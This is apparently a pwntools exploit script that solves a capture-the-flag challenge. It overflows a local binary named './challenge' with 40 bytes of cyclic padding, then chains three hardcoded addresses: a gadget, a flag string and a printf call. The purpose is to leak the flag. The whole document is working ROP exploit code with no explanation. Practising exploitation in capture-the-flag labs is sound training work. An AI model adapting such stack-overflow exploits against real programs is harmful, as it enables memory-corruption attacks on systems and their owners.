#!/usr/bin/env python3

from pwn import *

import sys

gagdet = p64(0x0040057b)
flag   = p64(0x00400650)
printf = p64(0x0040058e)

payload  = cyclic(40)
payload += gagdet
payload += flag
payload += printf

print(len(payload))
 
p = process("./challenge")

p.sendline(payload)

print(p.recvall())
